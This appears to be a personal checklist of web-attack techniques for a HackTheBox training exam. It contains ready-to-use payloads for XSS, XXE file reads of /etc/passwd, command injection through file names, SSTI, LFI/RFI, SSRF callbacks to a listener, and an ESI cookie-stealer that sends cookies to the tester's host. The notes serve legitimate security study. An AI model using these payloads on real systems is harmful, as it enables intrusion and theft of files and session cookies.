
 # Information Gathering Check list


- [ ] Check Wappalyzer 
- [ ] Check these ffuf scans

```Shell Session

###VHOST
ffuf -w ./vhosts -u http://192.168.10.10 -H "HOST: FUZZ.randomtarget.com" -fs 612

###DIR SCAN 
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ

### Extesion fuzzing
ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/indexFUZZ

#### SUB DIR FUZZING
ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php

#### Recursive Fuzzing
ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v

### Parameter Fuzzing 
##  GET
ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key -fs xxx
## POST 
ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx
###Value Fuzzing
ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx

```
``
# Wordlists

| **Command**                                                               | **Description**         |
| ------------------------------------------------------------------------- | ----------------------- |
| `/opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt` | Directory/Page Wordlist |
| `/opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt`           | Extensions Wordlist     |
| `/opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt`      | Domain Wordlist         |
| `/opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt`     | Parameters Wordlist     |

> [!tip]
>  When checking for parameter is good ideia do change the header content as is might influence on the response, like (Content-type,accept headers). Try to make a **CURL** REQUEST instead 


#  JAVASCRIPT DEOBFUSCATION

- [ ] check the  source code 
- [ ] check for js files on the page, like this   ![Pasted image 20240401221401](https://github.com/jrossbr157/HackThebox/assets/72611275/ffc2f61c-0783-4c5d-891f-139ea0071046)

- [ ] use this to run and test the JS code console [jsconsole](https://jsconsole.com/) [UnPacker (matthewfl.com)](https://matthewfl.com/unPacker.html)
- [ ] Use chat gpt for help

# XSS

- [ ] Check for possible XSS 
- [ ] Check if the XSS is possible for # Session Hijacking # check if some1 will review the post ![[Pasted image 20240403152514.png]]
# COMMAND INJECTIONS


- [ ] Check if the result is similar to a shell section ![[Pasted image 20240403160949.png]]

- [ ] Check if the post could break by using shell operators
- [ ] Check for filters ![[Pasted image 20240403164511.png]] ![[Pasted image 20240403164459.png]]


- [ ] Check every parameter on the page as it might lead to command injection 
![[Pasted image 20240403192855.png]]


---
# File upload


- [ ] Check for Client side validation, and every js script that might work with the page
Bypass basic filter by changing the POST request before seeding 
![[Pasted image 20240404204951.png]]

- [ ] Check for Possible Black list filter by 
	- [ ] if extension is case sensitive, as i can use ``pHp`` to bypass the filter 
	- [ ] If it accepts other types of .php extension with extension fuzzing 
	
- [ ] Check for White list type filter (use this to check files types [SecLists/Discovery/Web-Content/web-extensions.txt at master · danielmiessler/SecLists · GitHub](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt))![[Pasted image 20240404205449.png]]
	- [ ] Check for Double Extensions ![[Pasted image 20240404205748.png]]
	- [ ] Check for Reverse Duble extension ![[Pasted image 20240404205738.png]] 

- [ ] Try to use Duble extension and Extension fusion Technics  

> [!tip]
> The web application may still utilize a blacklist to deny requests containing `PHP` extensions. Try to fuzz the upload form with the [PHP Wordlist](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst) to find what extensions are blacklisted by the upload form.


- [ ] Check for Character Injection

- `%20`
- `%0a`
- `%00`
- `%0d0a`
- `/`
- `.\`
- `.`
- `…`
- `:`

```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```

> [!important]
> 
> Create a script in python  to apply all possibles attack configurations


- [ ] Check type filters by fuzzing all posibles types possibles 

```Shell
 wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Miscellaneous/web/content-type.txt
 cat content-type.txt | grep 'image/' > image-content-types.txt
```

![[Pasted image 20240404210329.png]]


> [!NOTE]
> A file upload HTTP request has two Content-Type headers, one for the attached file (at the bottom), and one for the full request (at the top). We usually need to modify the file's Content-Type header, but in some cases the request will only contain the main Content-Type header (e.g. if the uploaded content was sent as `POST` data), in which case we will need to modify the main Content-Type header.


- [ ] Check  MIME-Type and magic numbers 



if nothing works , you must check for some  Limited File Uploads  attacks  by using `SVG`, `HTML`, `XML`

 - [ ] XSS on comment section file upload 

- [ ] on Comment section 
```shell-session
Ross22@htb[/htb]$ exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
Ross22@htb[/htb]$ exiftool HTB.jpg
...SNIP...
Comment                         :  "><img src=1 onerror=alert(window.origin)>
```

- [ ] on SVG file
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```




 - [ ] Check for XXE paylods

- [ ] Check if can read file from the server 
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

- [ ] Check if can read source code 

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```


check for few other types of file upload attacks that can lead to RCE 
	Check for command injection on the file name `file$(whoami).jpg` or ``file`whoami`.jpg`` or `file.jpg||whoami`
	Try to send files with the same name 2 to check for errors 


---
# Server-side attacks

- [ ] Check if the page on port 8009 is vulnerable to AJP proxy ports (`8009 TCP`)
check of internal redirects like this ![[Pasted image 20240408121357.png]]


- [ ]  Check for SSRF explisit by testing the parameter 
```shell-session
curl -i -s "http://<TARGET IP>/load?q=http://<VPN/TUN Adapter IP>:8080"
```
- [ ] Check for blind SSRF with a Net Cat listener 

- [ ] if a SSRF is found, check for internal application on different ports by doing por fuzzing 

```shell-session
ffuf -w ./ports.txt:PORT -u "http://<TARGET IP>/load?q=http://127.0.0.1:PORT" -fs 30
```


- [ ] Check for blind SSRF  by checking request with NC , but some times you can use a file for that. Not sure with that possible on the exame but try using something like this 
```html
<!DOCTYPE html>
<html>
<body>
	<a>Hello World!</a>
	<img src="http://<SERVICE IP>:PORT/x?=viaimgtag">
</body>
</html>
```

## SSI
- [ ] Check for SSI by using the payloads, on places that might be reflect on the page  

```html
1. <!--#echo var="DATE_LOCAL" -->
2. <!--#printenv -->
```

## ESI
- [ ] For ESI i think would be the same, use the payload below to check for injection points 

```html
// Basic detection
<esi: include src=http://<PENTESTER IP>>

// XSS Exploitation Example
<esi: include src=http://<PENTESTER IP>/<XSSPAYLOAD.html>>

// Cookie Stealer (bypass httpOnly flag)
<esi: include src=http://<PENTESTER IP>/?cookie_stealer.php?=$(HTTP_COOKIE)>

// Introduce private local files (Not LFI per se)
<esi:include src="supersecret.txt">

// Valid for Akamai, sends debug information in the response
<esi:debug/>
```

## SSTI 
For SSTI this might help if a injection points is found 

[Template Injection Table - Hackmanit](https://cheatsheet.hackmanit.de/template-injection-table/)

- [ ] Check for SSTI with these basics payloads
```html
{7*7}
${7*7}
#{7*7}
%{7*7}
{{7*7}}
```


We can find the SSTI a different ways, but where a 3 exemples  where  

- [ ] Reflected text 
![[Pasted image 20240408124133.png]]


- [ ] \\\\POST///  the user input is submitted inside a parameter called `email` and through a POST request to `http://<TARGET IP>:<PORT>/jointheteam`

```shell-session
curl -X POST -d 'email=${7*7}' http://<TARGET IP>:<PORT>/jointheteam
```


GET 

![[Pasted image 20240408124343.png]]
![[Pasted image 20240408124352.png]]


> [!NOTE]
> 
> i don't think the exam will have any  XSLT


# HTTP Verb Tampering

- [ ] Test the different HTTP verbs when found something interesting that might need a different Request 

| `HEAD`    |
| --------- |
| `PUT`     |
| `DELETE`  |
| `OPTIONS` |
| `PATCH`   |

when received  with a ![[Pasted image 20240409155709.png]] try to change the request verb.


# Identifying IDORs

 check for easy IDORS by identifying some like this (`?uid=2`) or (`?filename=file_2.pdf`)

check for IDORS on file or other  itens that are requested by Guessable IDS, like ![[Pasted image 20240409162841.png]]
- [ ] Check for IDOR in API/JSON requests , like this 

![[Pasted image 20240409164729.png]]

---
# XXE

For xxe we have 2 possible  option for the exam:

1- During POST Requests 
![[Pasted image 20240409170346.png]]

> [!NOTE]
> Some web applications may default to a JSON format in HTTP request, but may still accept other formats, including XML. So, even if a web app sends requests in a JSON format, we can try changing the `Content-Type` header to `application/xml`, and then convert the JSON data to XML with an [online tool](https://www.convertjson.com/json-to-xml.htm). If the web application does accept the request with XML data, then we may also test it against XXE vulnerabilities, which may reveal an unanticipated XXE vulnerability.

- [ ] Check if application can accept XML by changing the header  and changing the content  ![[Pasted image 20240409180341.png]]

> [!tip]
> **Tip:** In certain Java web applications, we may also be able to specify a directory instead of a file, and we will get a directory listing instead, which can be useful for locating sensitive files.

- [ ] If found the possibility for a XXE,  check if can use the  Advanced Exfiltration with CDATA by using external DTD file 


- [ ] if the responses is not reflected just check for   Out-of-band Data Exfiltration by sending the response to your host 


2- File upload by svg,html files 

- [ ] on SVG file
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```






#  File Inclusions


check for commons   Local File Inclusion (LFI)     

/index.php?language=es.php
/index.php?language=/etc/passwd
/index.php?language=../../../../etc/passwd

**Note:** For this to work we must URL encode all characters, including the dots. Some URL encoders may not encode dots as they are considered to be part of the URL scheme.

# PHP Filters


check for  php filters
```shell-session
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
```

/index.php?language=config
/index.php?language=php://filter/read=convert.base64-encode/resource=config

# PHP Wrappers

- [ ] Check for PHP wrappers 


```shell-session
php://filter/read=convert.base64-encode/resource=../../../../etc/passwd
```


# Remote File Inclusion (RFI)

Check for RFI by including the local url  like 
>/index.php?language=http://127.0.0.1:80/index.php

> [!NOTE]
> **Note:** It may not be ideal to include the vulnerable page itself (i.e. index.php), as this may cause a recursive inclusion loop and cause a DoS to the back-end server.

use the burp-colaborator url for identifying the possible for RCE 

# LFI and File Uploads

- [ ] if could not  find a way to execute the file right away with file upload, look for somewhere where you can execute a LFI to execute that file 


# Log Poisoning

- [ ] if could execute a RCE directly you can use the log posining, but for that you need to identify the location of the log file 




# WEB SERVICE & API ATTACKS

Check for exposed WSDL file 
```shell-session
'http://<TARGET IP>:3002/wsdl?FUZZ'
```

# SOAPAction Spoofing
if a SOAP  file is found you can use it for RCE attack, but for that you need the soap to have some type of _ExecuteCommand_. configuration. That can be check on the file 



# API ATTACK


now we need to check of every type of attack on the APIs, but there a few tips that make it easier to identify some vulnerabilities 

> [!NOTE]
> When fuzzing parameter they will always respond with 200, so for that you might need to filter by size,word or lines so you can identify the real parameter 

```shell-session
 ffuf -w "/home/htb-acxxxxx/Desktop/Useful Repos/SecLists/Discovery/Web-Content/burp-parameter-names.txt" -u 'http://<TARGET IP>:3003/?FUZZ=test_value' -fs 19
```


when working with API is a good ideia to do recursive fuzzing to identify another APIs

```shell-session
 ffuf -w "/home/htb-acxxxxx/Desktop/Useful Repos/SecLists/Discovery/Web-Content/common-api-endpoints-mazen160.txt" -u 'http://<TARGET IP>:3000/api/FUZZ'
```


APIs are kin to have SSRF so try a few ideias for a SSRF

```shell-session
curl "http://<TARGET IP>:3000/api/userinfo?id=http://<VPN/TUN Adapter IP>:<LISTENER PORT>"
```

> [!NOTE]
> In many cases, APIs expect parameter values in a specific format/encoding. Let us try Base64-encoding `http://<VPN/TUN Adapter IP>:<LISTENER PORT>` and making an API call again.
> 
>   Server-Side Request Forgery (SSRF)

```shell-session
Ross22@htb[/htb]$ echo "http://<VPN/TUN Adapter IP>:<LISTENER PORT>" | tr -d '\n' | base64
Ross22@htb[/htb]$ curl "http://<TARGET IP>:3000/api/userinfo?id=<BASE64 blob>"
```

- [ ] Check for XXE on APIs



> [!NOTE]
> Some web applications may default to a JSON format in HTTP request, but may still accept other formats, including XML. So, even if a web app sends requests in a JSON format, we can try changing the `Content-Type` header to `application/xml`, and then convert the JSON data to XML with an [online tool](https://www.convertjson.com/json-to-xml.htm). If the web application does accept the request with XML data, then we may also test it against XXE vulnerabilities, which may reveal an unanticipated XXE vulnerability.

